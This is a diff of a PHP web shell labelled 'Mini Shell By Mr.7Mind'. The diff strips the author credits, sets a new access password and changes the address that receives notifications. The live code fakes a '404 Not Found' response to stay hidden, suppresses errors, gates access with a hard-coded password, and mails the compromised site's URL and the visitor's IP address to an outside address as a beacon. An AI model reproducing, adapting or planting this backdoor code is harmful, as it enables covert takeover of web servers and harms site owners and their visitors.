@@ -1,14 +1,14 @@
 <?php
 /*
-// Author : Mr.7Mind
-// Team   : RibelCyberTeam
-// Email  : ribelcyberteam@gmail.com
+// Author : 
+// Team   : 
+// Email  : 
 */
 set_time_limit(0);
 error_reporting(0);
 header('HTTP/1.0 404 Not Found', true, 404);
 session_start();
-$pass = "heker";
+$pass = "Turbo123@";
 $link = "fvck.txt";
 if($_POST['password'] == $pass) {
 	$_SESSION['forbidden'] = $pass;
@@ -136,7 +136,7 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
+$tujuanmail = 'off@off.com, off@off.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
